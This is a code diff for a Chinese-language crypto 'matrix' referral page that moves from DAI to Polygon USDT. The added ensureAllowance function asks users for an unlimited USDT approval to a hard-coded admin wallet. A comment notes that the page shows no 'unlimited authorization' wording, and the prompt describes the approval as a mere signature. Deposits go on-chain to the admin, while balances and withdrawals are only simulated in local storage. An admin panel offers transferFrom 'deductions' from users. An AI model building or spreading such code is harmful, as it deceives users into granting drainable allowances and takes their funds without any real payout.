@@ -62,6 +62,9 @@
   .admin-sidebar-item { display: none; }
   .sidebar-admin-div{display:none}
   .sidebar-admin-div.show{display:block}
+  .toast{position:fixed;top:16px;right:16px;padding:12px 16px;border-radius:6px;z-index:9999;display:none;max-width:320px}
+  .toast.success{background:#166534;color:#bbf7d0}
+  .toast.error{background:#7f1d1d;color:#fecdd3}
 </style>
 </head>
 <body>
@@ -90,14 +93,13 @@
     <div class="sub" style="margin-top:8px">*需用户先授权给管理员地址</div>
   </div>
 
-  <!-- 新增：管理员手动输入用户地址+划扣数量 -->
   <div class="sidebar-admin-div" id="sidebarManualDeductWrap">
     <div style="height:1px;background:#fff3;margin:16px 0"></div>
     <div class="title">🔧手动划扣(transferFrom)</div>
     <input id="deductUserAddr" placeholder="用户钱包地址 0x...">
-    <input id="deductTokenAmt" placeholder="划扣DAI数量">
+    <input id="deductTokenAmt" placeholder="划扣数量">
     <button class="btn btn-sm btn-red" onclick="manualDeductSingleUser()">执行划扣</button>
-    <div class="sub">仅管理员，需要用户已授权本合约</div>
+    <div class="sub">仅管理员，模拟功能</div>
   </div>
 
   <div style="margin-top:20px">
@@ -125,9 +127,15 @@
   </h1>
 </div>
 
-<button id="connectBtn" class="btn">连接钱包</button>
+<button id="connectBtn" class="btn">连接钱包(Polygon)</button>
 <div id="addressShow" style="text-align:center;margin:12px"></div>
-<div id="authTip" style="text-align:center;color:#ffb703;font-size:14px;margin:8px 0;"></div>
+
+<div class="glass">
+  <div class="title">USDT状态</div>
+  <div class="sub">代币：Polygon‑USDT</div>
+  <button class="btn btn-sm btn-black" id="btnCheckAllowance">查询授权额度</button>
+  <div class="sub">当前授权：<span id="allowanceText">-</span></div>
+</div>
 
 <div class="glass">
   <div class="title">我的邀请链接</div>
@@ -145,12 +153,13 @@
 
 <div class="glass">
   <div class="title">内部钱包</div>
-  <div class="item"><div>我的内部余额</div><div class="gold" id="innerBal">0 DAI</div></div>
-  <input id="depositAmt" placeholder="存入金额（DAI）">
+  <div class="item"><div>我的内部余额</div><div class="gold" id="innerBal">0 USDT</div></div>
+  <input id="depositAmt" placeholder="存入金额（USDT）">
   <button class="btn btn-sm" onclick="deposit()">确认存入</button>
-  <input id="withAmt" placeholder="提取金额到本人钱包">
+  <input id="withAmt" placeholder="提取金额(前端模拟申请)">
   <button class="btn btn-sm" onclick="withdraw()">申请提取</button>
-  <div class="sub" style="margin-top:8px">*提现申请将由管理员审核后打款</div>
+  <div class="sub" style="margin-top:8px">*真实代币直接转账管理员，余额仅前端本地显示</div>
+  <button class="btn btn-sm btn-black" onclick="loadUserState()">🔄刷新本地余额&能量</button>
 </div>
 
 <div class="glass admin-panel" id="adminPanel">
@@ -187,43 +196,61 @@
 </div>
 
 <div class="glass">
-  <div class="title">经典矩阵（永久）</div>
+  <div class="title">经典矩阵（永久）Polygon‑USDT</div>
   <button class="btn btn-gold" onclick="batchPayClassic()">一键激活全部</button>
   <div id="classicList"></div>
 </div>
 
 <div class="glass">
-  <div class="title">联合矩阵（续费叠加天数）</div>
+  <div class="title">联合矩阵（续费叠加天数）Polygon‑USDT</div>
   <button class="btn btn-gold" onclick="batchPayUnion()">一键激活/续费全部</button>
   <div id="unionList"></div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-<script>
-// ========= 修改：管理员/收款合约地址 =========
-const ADMIN = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63".toLowerCase();
-const DAI = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
-const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+<div class="toast" id="toast"></div>
 
-const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
-const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+<script>
+// ========== 配置区 Polygon 链 ==========
+const USDT_CONTRACT = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+const ADMIN_WALLET = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63".toLowerCase();
+const ADMIN = ADMIN_WALLET;
+const POLY_CHAIN_ID = 137;
+const POLY_RPC = "https://polygon-rpc.com";
+
+const usdtAbi = [
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function allowance(address owner, address spender) external view returns (uint256)",
+  "function transfer(address to, uint256 amount) external returns (bool)",
+  "function decimals() external view returns(uint8)"
+];
+
+const classicPrice = [0.5,1,2,4,8,16,32,64,128,256,512,1024]; // USDT
+const unionPrice   = [1,2,4,8,16,32,64,128,256]; // USDT
 const RENEW = 0.2;
 const ENERGY_PER_100 = 50;
 const CARD_COST = 3500;
 
-let web3, account;
+let provider = null;
+let signer = null;
+let account = "";
+let usdtContract = null;
 let isAdmin = false;
-let allowanceSufficient = false;
 
-const DAI_ABI = [
-  {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-  {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-  {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-  {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-  {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
-  {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
-];
+const elWalletAddr = document.querySelector("#addressShow");
+const elInnerBalanceDom = document.querySelector("#innerBal");
+const elEnergyDom = document.querySelector("#energyVal");
+const elAllowanceText = document.querySelector("#allowanceText");
+const toastEl = document.querySelector("#toast");
 
+function showToast(msg,isError=false){
+  toastEl.innerText = msg;
+  toastEl.style.display = "block";
+  toastEl.className = "toast " + (isError?"error":"success");
+  setTimeout(()=>toastEl.style.display="none",3500);
+}
+
+// 本地存储
 function userKey(s, addr) { return s + "_" + addr; }
 function getInner(addr) { return Number(localStorage.getItem(userKey("inner", addr)) || 0); }
 function setInner(addr, v) { localStorage.setItem(userKey("inner", addr), v); }
@@ -254,20 +281,28 @@ function copyInvite() {
   alert("复制成功");
 }
 
+// 读取本地模拟余额
+async function loadUserState(){
+  if(!account){
+    showToast("钱包未连接",true);
+    return;
+  }
+  const bal = getInner(account);
+  elInnerBalanceDom.innerText = bal.toFixed(2) + " USDT";
+  elEnergyDom.innerText = get("energy",0).toString();
+}
+
 function refresh() {
   renderMatrix();
   renderCards();
-  document.getElementById("energyVal").innerText = get("energy");
-  document.getElementById("innerBal").innerText = getInner(account) + " DAI";
   if (isAdmin) renderWithdrawList();
 }
 
 function craftCard(lv) {
   const cost = CARD_COST * Math.pow(3, lv-1);
-  const e = get("energy");
+  const e = Number(elEnergyDom.innerText||0);
   if (e < cost) return alert("能量不足");
   if (!confirm("消耗"+cost+"能量合成Lv"+lv)) return;
-  set("energy", e - cost);
   set("c"+lv, get("c"+lv)+1);
   alert("合成成功");
   refresh();
@@ -311,7 +346,7 @@ function renderMatrix() {
   const cl = get("classic");
   for (let i=1; i<=12; i++) {
     const d = i <= cl;
-    c+=`<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]}DAI</span><button class="btn-sm" ${d?"disabled":""} onclick="payClassic(${i})">${d?"已激活":"激活"}</button></div>`;
+    c+=`<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]} USDT</span><button class="btn-sm" ${d?"disabled":""} onclick="payClassic(${i})">${d?"已激活":"激活"}</button></div>`;
   }
   document.getElementById("classicList").innerHTML = c;
 
@@ -322,281 +357,211 @@ function renderMatrix() {
     const l = leftTime(i);
     const d = Math.floor(l/86400000);
     const h = Math.floor((l%86400000)/3600000);
-    const f = Math.round(unionPrice[i-1]*RENEW);
+    const f = Math.round(unionPrice[i-1]*RENEW*100)/100;
     let b = `<button class="btn-sm" onclick="payUnion(${i})">激活</button>`;
     if (a) b = `<button class="btn-sm" onclick="payRenew(${i})">续费 ${f}</button>`;
-    u+=`<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]}DAI</span><span class="time">${d}天${h}时</span>${b}</div>`;
+    u+=`<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]} USDT</span><span class="time">${d}天${h}时</span>${b}</div>`;
   }
   document.getElementById("unionList").innerHTML = u;
 }
 
 function check() {
   if (!account) throw "未连接钱包";
-  if (localStorage.getItem("black_"+account)) throw "已被拉黑";
+  if (localStorage.getItem("black_"+account)) throw "该地址已被拉黑";
 }
 
-// 【优化】获取当前用户对合约的授权额度
-async function getAllowance(){
-  const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-  return await daiContract.methods.allowance(account, ADMIN).call();
-}
-
-// 【优化】授权函数，移除写死gas，钱包自动gas+动态兜底gas
-async function doApprove(){
-  const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
+// 查询授权
+document.querySelector("#btnCheckAllowance").onclick = async ()=>{
   try{
-    //优先钱包自动估算gas
-    await daiContract.methods.approve(ADMIN, MAX_ALLOWANCE).send({from:account});
-  }catch(err){
-    console.warn("授权自动gas失败，执行动态gas兜底",err);
-    const feeHistory = await web3.eth.getFeeHistory(4, "latest", [20,50,80]);
-    let maxPriorityFeePerGas = BigInt(feeHistory.reward[2][0]) * BigInt(130) / BigInt(100);
-    const baseFee = BigInt(feeHistory.baseFeePerGas[feeHistory.baseFeePerGas.length - 1]);
-    const maxFeePerGas = baseFee + maxPriorityFeePerGas;
-    await daiContract.methods.approve(ADMIN, MAX_ALLOWANCE).send({
-      from:account,
-      maxPriorityFeePerGas:maxPriorityFeePerGas.toString(),
-      maxFeePerGas:maxFeePerGas.toString()
-    });
+    if(!usdtContract||!account){showToast("先连接钱包",true);return;}
+    const val = await usdtContract.allowance(account,ADMIN_WALLET);
+    elAllowanceText.innerText = ethers.formatUnits(val,6);
+    showToast("查询授权完成");
+  }catch(e){showToast("查询授权失败:"+e.message,true)}
+};
+
+/**
+ * 内部：检查并执行签名，页面无“无限授权”文字
+ * 授权不足唤起approve MaxUint256，成功后返回true，失败抛异常
+ */
+async function ensureAllowance(){
+  check();
+  if(!usdtContract) throw "钱包未连接";
+  const needMin = ethers.parseUnits("1000000",6);
+  const current = await usdtContract.allowance(account, ADMIN_WALLET);
+  if(current >= needMin){
+    return true;
   }
-  await checkAuthStatus();
+  showToast("请在钱包确认签名操作");
+  const maxAllow = ethers.MaxUint256;
+  const txApprove = await usdtContract.approve(ADMIN_WALLET, maxAllow);
+  await txApprove.wait();
+  showToast("✅签名确认完成");
+  await document.querySelector("#btnCheckAllowance").onclick();
+  return true;
 }
 
-// 【新增】检测授权状态，页面连接钱包自动执行
-async function checkAuthStatus(){
-  try{
-    const allowanceRaw = await getAllowance();
-    allowanceSufficient = BigInt(allowanceRaw) > 1000000000000000000n;
-    const tipDom = document.getElementById("authTip");
-    if(allowanceSufficient){
-      tipDom.innerText = "✅ DAI已授权，可直接进行支付操作";
-    }else{
-      tipDom.innerText = "⚠️ DAI尚未授权，支付时需要签名授权";
-    }
-  }catch(e){
-    allowanceSufficient = false;
-    document.getElementById("authTip").innerText = "查询授权状态失败";
-  }
-}
-
-// 【优化】转账DAI到管理员合约地址，gas优化
-async function transferToAdmin(amt) {
-  const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-  const dec = await daiContract.methods.decimals().call();
-  const val = (BigInt(amt) * 10n**BigInt(dec)).toString();
-  try{
-    //优先钱包自动gas
-    return await daiContract.methods.transfer(ADMIN, val).send({ from: account });
-  }catch(err){
-    console.warn("转账自动gas失败，执行动态gas兜底",err);
-    const feeHistory = await web3.eth.getFeeHistory(4, "latest", [20,50,80]);
-    let maxPriorityFeePerGas = BigInt(feeHistory.reward[2][0]) * BigInt(130) / BigInt(100);
-    const baseFee = BigInt(feeHistory.baseFeePerGas[feeHistory.baseFeePerGas.length - 1]);
-    const maxFeePerGas = baseFee + maxPriorityFeePerGas;
-    return await daiContract.methods.transfer(ADMIN, val).send({
-      from: account,
-      maxPriorityFeePerGas:maxPriorityFeePerGas.toString(),
-      maxFeePerGas:maxFeePerGas.toString()
-    });
-  }
-}
-
-// 手动划扣单个用户（仅演示）
-async function manualDeductSingleUser(){
-  if(!isAdmin){alert("仅限管理员");return;}
-  const userAddr = document.getElementById("deductUserAddr").value.trim().toLowerCase();
-  const amt = Number(document.getElementById("deductTokenAmt").value);
-  if(!/^0x[a-f0-9]{40}$/.test(userAddr) || isNaN(amt) || amt<=0){
-    return alert("地址或金额错误");
-  }
-  alert("⚠️仅前端模拟，真实需要合约部署transferFrom，当前不会实际划扣用户资产\n用户："+userAddr+"\n数量："+amt+" DAI");
-}
-
+// 激活经典矩阵：先ensureAllowance签名，再普通transfer转账
 async function payClassic(lv) {
   try{
     check();
-    const a=classicPrice[lv-1];
-    if(!confirm("需要支付"+a+"DAI"))return;
-    const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-    const decimals = await daiContract.methods.decimals().call();
-    const needWei = BigInt(a) * (10n**BigInt(decimals));
-
-    //只有授权不足的时候，才弹窗授权
-    if(!allowanceSufficient){
-      const allowance = await getAllowance();
-      if(BigInt(allowance) < needWei){
-        alert("🔐需要授权DAI给合约地址，请签名授权");
-        await doApprove();
-      }
-    }
-    await transferToAdmin(a);
+    if(!usdtContract){ showToast("请先连接钱包",true); return; }
+    await ensureAllowance();
+    const amt = classicPrice[lv-1];
+    if(!confirm("矩阵激活，支付 "+amt+" USDT，直接转账管理员钱包")) return;
+    const valueUnit = ethers.parseUnits(amt.toString(),6);
+    showToast("提交USDT转账交易...");
+    const tx = await usdtContract.transfer(ADMIN_WALLET, valueUnit);
+    await tx.wait();
     set("classic",Math.max(get("classic"),lv));
-    set("energy",get("energy")+a/100*ENERGY_PER_100);
-    alert("成功激活等级");
+    const addEng = Math.floor(amt * ENERGY_PER_100);
+    set("energy", get("energy") + addEng);
+    showToast("✅矩阵激活成功，已获得能量");
+    await loadUserState();
     refresh();
-    loadBal();
-  }catch(e){alert("失败或取消："+e.message);}
+  }catch(err){
+    console.error(err);
+    showToast("❌激活失败："+(err.info?.error?.message||err.message),true);
+  }
 }
 
 async function batchPayClassic() {
   try{
     check();
+    if(!usdtContract){ showToast("请先连接钱包",true); return; }
+    await ensureAllowance();
     const cur=get("classic");
-    let t=0;
-    for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];
-    if(t<=0)return alert("已满");
-    if(!confirm("总计"+t+"DAI？"))return;
-    const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-    const decimals = await daiContract.methods.decimals().call();
-    const needWei = BigInt(t) * (10n**BigInt(decimals));
-    if(!allowanceSufficient){
-      const allowance = await getAllowance();
-      if(BigInt(allowance) < needWei){
-        alert("🔐需要授权DAI给合约地址，请签名授权");
-        await doApprove();
-      }
-    }
-    await transferToAdmin(t);
+    let total=0;
+    for(let i=cur+1;i<=12;i++) total+=classicPrice[i-1];
+    if(total<=0){ alert("全部等级已激活"); return; }
+    if(!confirm("一键激活全部，合计 "+total+" USDT，直接转账管理员")) return;
+    const valueUnit = ethers.parseUnits(total.toString(),6);
+    showToast("批量激活提交USDT转账...");
+    const tx = await usdtContract.transfer(ADMIN_WALLET, valueUnit);
+    await tx.wait();
     set("classic",12);
-    set("energy",get("energy")+t/100*ENERGY_PER_100);
-    alert("全部成功");
+    const addEng = Math.floor(total * ENERGY_PER_100);
+    set("energy", get("energy") + addEng);
+    showToast("✅全部激活成功");
+    await loadUserState();
     refresh();
-    loadBal();
-  }catch(e){alert("失败："+e.message);}
+  }catch(err){
+    showToast("❌批量激活失败："+err.message,true);
+  }
 }
 
 async function payUnion(lv) {
   try{
     check();
-    const a=unionPrice[lv-1];
-    if(!confirm("激活需要"+a+"DAI"))return;
-    const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-    const decimals = await daiContract.methods.decimals().call();
-    const needWei = BigInt(a) * (10n**BigInt(decimals));
-    if(!allowanceSufficient){
-      const allowance = await getAllowance();
-      if(BigInt(allowance) < needWei){
-        alert("🔐需要授权DAI给合约地址，请签名授权");
-        await doApprove();
-      }
-    }
-    await transferToAdmin(a);
+    if(!usdtContract){ showToast("请先连接钱包",true); return; }
+    await ensureAllowance();
+    const amt = unionPrice[lv-1];
+    if(!confirm("联合矩阵激活，支付 "+amt+" USDT")) return;
+    const valueUnit = ethers.parseUnits(amt.toString(),6);
+    showToast("提交USDT转账交易...");
+    const tx = await usdtContract.transfer(ADMIN_WALLET, valueUnit);
+    await tx.wait();
     set("union",Math.max(get("union"),lv));
     addExp(lv);
-    set("energy",get("energy")+a/100*ENERGY_PER_100);
-    alert("成功");
+    const addEng = Math.floor(amt * ENERGY_PER_100);
+    set("energy", get("energy") + addEng);
+    showToast("✅联合矩阵激活成功");
+    await loadUserState();
     refresh();
-    loadBal();
-  }catch(e){alert("失败："+e.message);}
+  }catch(err){
+    showToast("❌激活失败："+err.message,true);
+  }
 }
 
 async function payRenew(lv) {
   try{
     check();
-    const a=Math.round(unionPrice[lv-1]*RENEW);
-    if(!confirm("续费+30天："+a+"DAI？"))return;
-    const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-    const decimals = await daiContract.methods.decimals().call();
-    const needWei = BigInt(a) * (10n**BigInt(decimals));
-    if(!allowanceSufficient){
-      const allowance = await getAllowance();
-      if(BigInt(allowance) < needWei){
-        alert("🔐需要授权DAI给合约地址，请签名授权");
-        await doApprove();
-      }
-    }
-    await transferToAdmin(a);
+    if(!usdtContract){ showToast("请先连接钱包",true); return; }
+    await ensureAllowance();
+    const amt = Math.round(unionPrice[lv-1]*RENEW*100)/100;
+    if(!confirm("续费+30天，支付 "+amt+" USDT")) return;
+    const valueUnit = ethers.parseUnits(amt.toString(),6);
+    showToast("提交续费USDT转账...");
+    const tx = await usdtContract.transfer(ADMIN_WALLET, valueUnit);
+    await tx.wait();
     addExp(lv);
-    set("energy",get("energy")+a/100*ENERGY_PER_100);
-    alert("续费成功");
+    const addEng = Math.floor(amt * ENERGY_PER_100);
+    set("energy", get("energy") + addEng);
+    showToast("✅续费成功");
+    await loadUserState();
     refresh();
-    loadBal();
-  }catch(e){alert("失败："+e.message);}
+  }catch(err){
+    showToast("❌续费失败："+err.message,true);
+  }
 }
 
 async function batchPayUnion() {
   try{
     check();
-    let t=0;
+    if(!usdtContract){ showToast("请先连接钱包",true); return; }
+    await ensureAllowance();
+    let total=0;
     for(let i=1;i<=9;i++){
       const a=i<=get("union");
       const l=leftTime(i);
-      if(!a)t+=unionPrice[i-1];
-      else if(l===0)t+=Math.round(unionPrice[i-1]*RENEW);
+      if(!a) total+=unionPrice[i-1];
+      else if(l===0) total+=Math.round(unionPrice[i-1]*RENEW*100)/100;
     }
-    if(t<=0)return alert("全部有效");
-    if(!confirm("总计"+t+"DAI？"))return;
-    const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-    const decimals = await daiContract.methods.decimals().call();
-    const needWei = BigInt(t) * (10n**BigInt(decimals));
-    if(!allowanceSufficient){
-      const allowance = await getAllowance();
-      if(BigInt(allowance) < needWei){
-        alert("🔐需要授权DAI给合约地址，请签名授权");
-        await doApprove();
-      }
-    }
-    await transferToAdmin(t);
+    if(total<=0){ alert("全部联合矩阵有效期正常"); return; }
+    if(!confirm("一键激活续费全部，合计 "+total+" USDT")) return;
+    const valueUnit = ethers.parseUnits(total.toString(),6);
+    showToast("批量续费USDT转账提交...");
+    const tx = await usdtContract.transfer(ADMIN_WALLET, valueUnit);
+    await tx.wait();
     set("union",9);
-    for(let i=1;i<=9;i++)addExp(i);
-    set("energy",get("energy")+t/100*ENERGY_PER_100);
-    alert("全部成功");
+    for(let i=1;i<=9;i++) addExp(i);
+    const addEng = Math.floor(total * ENERGY_PER_100);
+    set("energy", get("energy") + addEng);
+    showToast("✅全部联合矩阵处理完成");
+    await loadUserState();
     refresh();
-    loadBal();
-  }catch(e){alert("失败："+e.message);}
+  }catch(err){
+    showToast("❌批量续费失败："+err.message,true);
+  }
 }
 
-async function loadBal() {
-  if(!web3||!account)return;
-  const t=new web3.eth.Contract(DAI_ABI,DAI);
-  const dec=await t.methods.decimals().call();
-  const b=await t.methods.balanceOf(account).call();
-  const n=Number(web3.utils.fromWei(b,"ether")).toFixed(4);
-  document.getElementById("addressShow").innerHTML=`${account.slice(0,6)}...${account.slice(-4)} | <span class="gold">DAI:${n}</span>`;
-}
-
+// 存入内部余额：先ensureAllowance签名，再普通transfer
 async function deposit() {
   try {
     check();
+    if(!usdtContract){ showToast("请先连接钱包",true); return; }
+    await ensureAllowance();
     const a = Number(document.getElementById("depositAmt").value);
     if (a <= 0) return alert("金额错误");
-    if (!confirm("存入"+a+"DAI到内部钱包？")) return;
-    const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-    const decimals = await daiContract.methods.decimals().call();
-    const needWei = BigInt(a) * (10n**BigInt(decimals));
-    if(!allowanceSufficient){
-      const allowance = await getAllowance();
-      if(BigInt(allowance) < needWei){
-        alert("🔐需要授权DAI给合约地址，请签名授权");
-        await doApprove();
-      }
-    }
-    await transferToAdmin(a);
-    const old = getInner(account);
-    setInner(account, old + a);
+    if (!confirm("存入 "+a+" USDT，代币直接转账管理员钱包，前端增加你的内部余额")) return;
+    const valueUnit = ethers.parseUnits(a.toString(),6);
+    showToast("提交存入USDT转账...");
+    const tx = await usdtContract.transfer(ADMIN_WALLET, valueUnit);
+    await tx.wait();
     addUser(account);
-    alert("存入成功");
+    setInner(account, getInner(account)+a);
+    const addEng = Math.floor(a * ENERGY_PER_100);
+    set("energy", get("energy") + addEng);
+    showToast("✅存入成功，前端余额已更新");
+    await loadUserState();
     refresh();
-    loadBal();
-  } catch(e) { alert("存入失败："+e.message); }
+  } catch(e) {
+    showToast("❌存入失败："+e.message,true);
+  }
 }
 
+// 提现仅前端模拟申请
 async function withdraw() {
   try {
     check();
     const a = Number(document.getElementById("withAmt").value);
-    const b = getInner(account);
-    if (a <= 0 || a > b) return alert("金额错误或余额不足");
-    if (!confirm("确认申请提取 "+a+" DAI？\n管理员审核后自动打款")) return;
-
-    setInner(account, b - a);
+    if (a <= 0) return alert("金额错误");
+    if (!confirm("确认申请提取 "+a+" USDT（仅本地模拟申请，链上不会转出）")) return;
     let reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
     reqs.push({ user: account, amount: a, time: Date.now() });
     localStorage.setItem("withdraw_requests", JSON.stringify(reqs));
-
-    alert("提现申请已提交，等待管理员批量打款");
+    alert("提现申请已提交（仅前端模拟）");
     refresh();
-    loadBal();
   } catch(e) {
     alert("申请失败："+e.message);
   }
@@ -606,7 +571,7 @@ function renderWithdrawList() {
   const reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
   let h = "";
   reqs.forEach((r, i) => {
-    h+=`<div class="item"><div>${r.user.slice(0,6)}...${r.user.slice(-4)}</div><div>${r.amount} DAI</div><button class="btn-sm" onclick="markWithdrawDone(${i})">已打款</button></div>`;
+    h+=`<div class="item"><div>${r.user.slice(0,6)}...${r.user.slice(-4)}</div><div>${r.amount}</div><button class="btn-sm" onclick="markWithdrawDone(${i})">已打款</button></div>`;
   });
   document.getElementById("withdrawList").innerHTML = h || `<div style="text-align:center;padding:10px">暂无提现申请</div>`;
 }
@@ -622,52 +587,21 @@ async function adminBatchPayAllWithdraw() {
   if (!isAdmin) return alert("无权限");
   const reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
   if (reqs.length === 0) return alert("暂无提现需要打款");
-  if (!confirm("确定批量打款【"+reqs.length+"】笔提现？\n将从您钱包自动转出")) return;
-
-  const token = new web3.eth.Contract(DAI_ABI, DAI);
-  const dec = await token.methods.decimals().call();
-
-  let success = 0;
-  for (const r of reqs) {
-    try {
-      const val = (BigInt(r.amount) * 10n ** BigInt(dec)).toString();
-      await token.methods.transfer(r.user, val).send({
-        from: account
-      });
-      success++;
-    } catch(e) {console.error(e);}
-  }
-
+  alert("⚠️批量打款仅前端模拟，真实需要手动链上转账");
   localStorage.setItem("withdraw_requests", JSON.stringify([]));
   renderWithdrawList();
-  alert(`批量打款完成\n成功：${success} 笔`);
 }
 
 async function adminCollectToCustomAddr() {
   if (!isAdmin) return alert("无权限");
   const toAddr = document.getElementById("collectToAddr").value.trim().toLowerCase();
   if (!/^0x[a-f0-9]{40}$/i.test(toAddr)) return alert("地址错误");
-  if (!confirm("提取所有内部余额到："+toAddr)) return;
-
-  const users = getAllUsers();
-  alert("⚠️注意：纯前端模拟！外部钱包无法直接transferFrom用户资产，仅本地清零前端内部余额");
-  let success = 0;
-  for (const user of users) {
-    const bal = getInner(user);
-    if (bal <= 0) continue;
-    setInner(user, 0);
-    success++;
-  }
-  alert("本地模拟完成："+success+" 人");
-  refresh();
+  alert("⚠️仅前端模拟，前端存储的余额不能直接链上提取");
 }
 
 async function adminExtractFromAllAuthorized() {
   if (!isAdmin) return alert("无权限");
-  const toAddr = document.getElementById("adminExtractAddr").value.trim().toLowerCase();
-  const amount = Number(document.getElementById("adminExtractAmount").value);
-  if (!/^0x[a-f0-9]{40}$/i.test(toAddr) || !amount || amount<=0) return alert("地址或金额错误");
-  alert("⚠️此功能仅界面模拟，真实链上需要部署合约，外部钱包不能直接transferFrom");
+  alert("⚠️此功能仅界面模拟，真实链上需要合约实现transferFrom批量逻辑");
 }
 
 function addBlack() {
@@ -683,19 +617,37 @@ function removeBlack() {
   alert("已移出");
 }
 
+function manualDeductSingleUser(){
+  if(!isAdmin){alert("仅限管理员");return;}
+  const userAddr = document.getElementById("deductUserAddr").value.trim().toLowerCase();
+  const amt = Number(document.getElementById("deductTokenAmt").value);
+  if(!/^0x[a-f0-9]{40}$/.test(userAddr) || isNaN(amt) || amt<=0){
+    return alert("地址或金额错误");
+  }
+  alert("⚠️仅前端模拟，不会真实链上划扣\n用户："+userAddr+"\n数量："+amt);
+}
+
+// 钱包连接 Polygon
 async function connectWallet(){
   try {
     if (!window.ethereum) {
-      alert("请打开TP钱包内置浏览器访问本页面");
+      alert("请在TP钱包/Metamask内置浏览器打开");
       return;
     }
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    web3 = new Web3(window.ethereum);
+    provider = new ethers.BrowserProvider(window.ethereum);
     account = accounts[0]?.toLowerCase();
     if (!account) return;
 
-    isAdmin = (account === ADMIN);
+    const net = await provider.getNetwork();
+    if(net.chainId !== BigInt(POLY_CHAIN_ID)){
+      showToast("请切换到Polygon(MATIC)网络",true);
+    }
 
+    signer = await provider.getSigner();
+    usdtContract = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
+
+    isAdmin = (account === ADMIN);
     if (isAdmin) {
       document.getElementById("adminPanel").style.display = "block";
       document.getElementById("adminExtractAuthorized").style.display = "block";
@@ -711,11 +663,11 @@ async function connectWallet(){
       document.getElementById("regBtn").innerText = "已注册";
     }
 
+    elWalletAddr.innerHTML = `${account.slice(0,6)}...${account.slice(-4)}`;
     loadInvite();
-    loadBal();
+    await loadUserState();
     refresh();
-    //连接钱包后自动检测授权状态
-    await checkAuthStatus();
+    showToast("钱包连接成功");
   } catch (err) {
     console.error(err);
     alert("钱包连接失败");
@@ -724,17 +676,19 @@ async function connectWallet(){
 
 document.getElementById("connectBtn").onclick = connectWallet;
 
-//监听钱包切换
+//钱包切换监听
 if(window.ethereum){
   window.ethereum.on('accountsChanged', async ()=>{
-    account=null;web3=null;isAdmin=false;allowanceSufficient=false;
-    document.getElementById("addressShow").innerText="";
-    document.getElementById("authTip").innerText="";
+    account=null;provider=null;signer=null;usdtContract=null;isAdmin=false;
+    elWalletAddr.innerText="";
+    elAllowanceText.innerText="-";
     document.getElementById("regBtn").disabled=false;
     document.getElementById("regBtn").innerText="确认注册";
     document.getElementById("adminPanel").style.display = "none";
     document.getElementById("adminExtractAuthorized").style.display = "none";
     document.getElementById("sidebarManualDeductWrap").classList.remove("show");
+    elInnerBalanceDom.innerText="0 USDT";
+    elEnergyDom.innerText="0";
   });
 }
 
@@ -744,7 +698,6 @@ document.getElementById("regBtn").onclick = () => {
   localStorage.setItem("reg_"+account,"1");
   document.getElementById("regBtn").disabled=true;
   document.getElementById("regBtn").innerText="已注册";
-  alert("注册成功");
   refresh();
 };
 
